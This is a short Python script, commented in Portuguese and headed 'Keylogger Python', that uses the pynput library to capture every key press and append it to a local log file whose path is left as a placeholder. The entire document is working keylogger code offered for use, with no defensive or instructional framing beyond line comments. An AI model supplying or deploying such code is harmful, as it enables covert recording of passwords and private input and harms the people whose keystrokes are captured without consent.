####################################################################
#                      Keylogger Python                            #
####################################################################

#Importando a biblioteca pynput, e o método Listener.
from pynput.keyboard import Listener

#Localização onde será salvo o arquivo de log
logFile = "Caminho do txt"

#Função para receber tecla pressionada
def writeLog(key):
    #Convertendo a tecla pressionada p/ string
    keydata = str(key)

    #Arquivo de log
    with open(logFile, "a") as f:
        f.write(keydata)

#Escutando o evento on_press
#no momento que o evento on_press ocorrer, chamar a função writeLog acima
with Listener(on_press=writeLog) as l:
    l.join()
